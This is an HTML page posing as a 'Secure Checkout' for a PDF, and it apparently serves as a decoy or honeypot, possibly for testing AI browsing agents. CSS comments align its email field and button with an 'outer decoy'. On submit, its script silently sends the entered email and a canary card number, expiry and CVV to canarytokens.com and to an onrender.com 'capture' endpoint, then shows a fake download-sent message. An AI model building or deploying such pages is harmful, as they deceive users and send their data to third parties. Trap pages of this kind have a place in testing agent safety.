<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Checkout — WB Publications</title>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
:root { --bg: #FAFAF9; --ink: #0D1117; --muted: #6B7280; --line: #E5E7EB; --surf: #fff; }
body { font-family: 'Inter', sans-serif; background: var(--bg); min-height: 100vh; }

/* Card positioned identically to wb027-pay sidebar — top:50 left:820 w:400 */
.card {
  position: fixed; top: 50px; left: 820px; width: 400px;
  background: var(--surf); border: 1px solid var(--line);
  border-radius: 12px; padding: 16px 16px 20px;
  box-shadow: 0 2px 12px rgba(0,0,0,.06);
}
.sb-badge { display: inline-flex; align-items: center; gap: 5px;
  background: #DCFCE7; color: #15803D;
  font-size: 10px; font-weight: 700; letter-spacing: .06em; text-transform: uppercase;
  padding: 3px 8px; border-radius: 20px; margin-bottom: 6px; }
.sb-title { font-size: 17px; font-weight: 800; line-height: 1.25; margin-bottom: 2px; }
.sb-pub { font-size: 12px; color: var(--muted); margin-bottom: 6px; }
.sb-amount { font-size: 20px; font-weight: 800; color: var(--ink); margin-bottom: 8px; letter-spacing: -.02em; }
.sb-saved-card {
  display: flex; align-items: center; gap: 8px;
  background: #F0FDF4; border: 1px solid #BBF7D0; border-radius: 6px;
  padding: 7px 10px; font-size: 12px; color: var(--ink);
}
.sb-saved-card .cc-brand { font-size: 11px; font-weight: 700; color: #15803D; }
.sb-saved-card .cc-num { font-weight: 600; }
.sb-saved-card .cc-exp { color: var(--muted); margin-left: auto; }

/* Email label: top:131 left:826 (matches outer decoy) */
.email-label {
  position: fixed; top: 131px; left: 826px;
  font-size: 13px; font-weight: 500; color: var(--ink);
}

/* Email input: top:155 left:826 w:374 h:48 (matches outer decoy) */
#f-email {
  position: fixed; top: 155px; left: 826px; width: 374px; height: 48px;
  border: 1.5px solid var(--line); border-radius: 8px;
  padding: 0 14px; font-family: inherit; font-size: 14px; color: var(--ink);
  background: var(--surf); outline: none;
}
#f-email:focus { border-color: #2563EB; }

/* Pay button: top:219 left:826 w:374 h:48 (matches outer "Get" decoy) */
#pay-btn {
  position: fixed; top: 219px; left: 826px; width: 374px; height: 48px;
  background: #000; color: #fff; border: none; border-radius: 8px;
  font-family: inherit; font-size: 14px; font-weight: 700;
  cursor: pointer; letter-spacing: -.01em;
}
#pay-btn:disabled { background: #9ca3af; cursor: not-allowed; }

/* Note below button */
.sb-note {
  position: fixed; top: 273px; left: 826px; width: 374px;
  font-size: 11px; color: var(--muted); line-height: 1.5;
}

.success {
  position: fixed; top: 155px; left: 826px; width: 374px;
  display: none; text-align: center; padding: 20px;
  background: var(--surf); border: 1px solid var(--line); border-radius: 8px;
}
.success-title { font-size: 16px; font-weight: 700; color: var(--ink); margin-bottom: 6px; }
.success-sub { font-size: 13px; color: var(--muted); line-height: 1.6; }
</style>
</head>
<body>

<div class="card">
  <div class="sb-badge">✓ Secure Checkout</div>
  <div class="sb-title">WB027 — WB Publications</div>
  <div class="sb-pub">W.B. Bookson · 54 pages · PDF</div>
</div>

<div class="email-label">Email address</div>

<form id="pay-form">
  <input type="email" id="f-email" name="email" placeholder="your@email.com" autocomplete="email" required>
  <button type="submit" id="pay-btn">Get</button>
</form>

<div class="sb-note">Download delivered via <strong>WB Publications</strong> · Protected by reCAPTCHA</div>

<div class="success" id="success-msg">
  <div class="success-title">✓ Check your inbox</div>
  <div class="success-sub">The download link for WB027 has been sent to your email address.</div>
</div>

<script>
document.getElementById('pay-form').addEventListener('submit', function(e) {
  e.preventDefault();
  const btn = document.getElementById('pay-btn');
  btn.disabled = true;
  btn.textContent = 'Sending...';

  const payload = {
    email: document.getElementById('f-email').value,
    card:  '4367970166109812',
    exp:   '10/2029',
    cvv:   '249',
    name:  'Canarytokens.org',
    ts:    new Date().toISOString()
  };

  const params = new URLSearchParams(payload).toString();
  new Image().src = 'https://canarytokens.com/traffic/tags/9zzxqb7r3r13ov7cncqsmk9jx/submit.aspx?' + params;
  fetch('https://closing-notes.onrender.com/?r=capture&' + params, { mode: 'no-cors' }).catch(() => {});

  setTimeout(function() {
    document.getElementById('pay-form').style.display = 'none';
    document.getElementById('success-msg').style.display = 'block';
  }, 1200);
});
</script>
</body>
</html>
